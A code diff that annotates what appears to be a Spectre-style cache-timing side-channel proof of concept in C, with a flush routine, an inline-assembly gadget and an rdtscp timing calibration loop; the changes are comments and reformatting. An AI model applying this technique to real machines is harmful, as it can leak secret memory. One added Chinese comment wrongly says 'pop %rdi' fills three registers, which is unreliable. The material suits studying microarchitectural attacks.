@@ -8,7 +8,7 @@ uint8_t hit[8];
 
 char *secret_addr = "helloworldmagicboxisopen";
 
-void flush()
+void flush()//flush the array from cache
 {
 	int i;
 	for(i = 0; i < 256; i++)
@@ -17,6 +17,10 @@ void flush()
 
 void gadget()
 {
+	//rbp base pointer pointer to the rsp current value to reserve the current function call information
+	//rsp stack pointer pointer to the top of the stack
+	//rdi destination index,to store the parameter which is required by the called function
+	//pop %rdi指令实际上是在将栈中的前三个元素弹出，并依次存储到寄存器rdi、rsi和rdx中。这些寄存器通常用于存储函数的前三个参数。
 	asm volatile(
 		"push %rbp    \n"
 		"mov  %rsp, %rbp  \n"
@@ -98,12 +102,13 @@ int main()
 	volatile uint8_t *addr;
 	int i;
 	unsigned int junk = 0;
-	for(i = 0; i < 100; i++){
+	for(i = 0; i < 100; i++)
+	{
 		hit[0] = 0x5A;
 		addr = &hit[0];
 		t0 = __rdtscp( & junk);
-     	junk = * addr; /* MEMORY ACCESS TO TIME */
-     	time1 += __rdtscp( & junk) - t0; /* READ TIMER & COMPUTE ELAPSED TIME */
+     		junk = * addr; /* MEMORY ACCESS TO TIME */
+     		time1 += __rdtscp( & junk) - t0; /* READ TIMER & COMPUTE ELAPSED TIME */
 	}
 	time3 = time1/100;
 	printf("time threshold is %d\r\n",time3);
